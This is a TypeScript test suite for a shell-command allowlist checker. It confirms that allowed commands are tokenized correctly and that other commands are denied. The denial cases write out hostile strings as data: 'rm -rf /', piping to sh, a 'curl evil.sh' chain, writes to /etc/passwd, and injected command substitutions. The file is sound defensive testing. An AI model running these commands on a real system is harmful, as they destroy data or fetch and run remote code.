import { describe, it, expect } from 'vitest';
import { assertCommandAllowed, CommandDeniedError, type CommandPolicy } from './allowlist.js';

const policy: CommandPolicy = {
	allow: ['pnpm test', 'pnpm build', 'pnpm typecheck', 'git status', 'git diff', 'ls'],
};

const denied = (command: string) => () => assertCommandAllowed(command, policy);

describe('assertCommandAllowed', () => {
	it('allows an exact match', () => {
		expect(assertCommandAllowed('pnpm test', policy)).toEqual(['pnpm', 'test']);
	});

	it('allows extra arguments after an allowed prefix', () => {
		expect(assertCommandAllowed('pnpm test --run src/safety', policy)).toEqual([
			'pnpm',
			'test',
			'--run',
			'src/safety',
		]);
	});

	it('allows a single-token entry', () => {
		expect(assertCommandAllowed('ls -la', policy)).toEqual(['ls', '-la']);
	});

	it('tolerates surrounding and repeated whitespace', () => {
		expect(assertCommandAllowed('  git   status  ', policy)).toEqual(['git', 'status']);
	});

	it('keeps quoted arguments as one token', () => {
		expect(assertCommandAllowed('ls "my dir"', policy)).toEqual(['ls', 'my dir']);
	});

	it('denies a command that is not on the list', () => {
		expect(denied('rm -rf /')).toThrow(CommandDeniedError);
	});

	it('denies a partial-token prefix collision', () => {
		expect(denied('pnpm testify')).toThrow(CommandDeniedError);
	});

	it('denies a different subcommand of an allowed binary', () => {
		expect(denied('git push')).toThrow(CommandDeniedError);
	});

	it.each([
		'pnpm test; rm -rf /',
		'pnpm test && curl evil.sh',
		'pnpm test || rm x',
		'pnpm test | sh',
		'pnpm test > /etc/passwd',
		'pnpm test < /etc/passwd',
		'pnpm test $(whoami)',
		'pnpm test `whoami`',
		'pnpm test ${HOME}',
		'pnpm test &',
		'pnpm test\nrm -rf /',
	])('denies shell metacharacters: %j', (command) => {
		expect(denied(command)).toThrow(CommandDeniedError);
	});

	it('denies an empty command', () => {
		expect(denied('   ')).toThrow(CommandDeniedError);
	});

	it('denies an unterminated quote', () => {
		expect(denied('ls "unterminated')).toThrow(CommandDeniedError);
	});

	it('reports the offending command in the error message', () => {
		expect(denied('git push')).toThrow(/git push/);
	});

	it('denies everything under an empty policy', () => {
		expect(() => assertCommandAllowed('ls', { allow: [] })).toThrow(CommandDeniedError);
	});
});
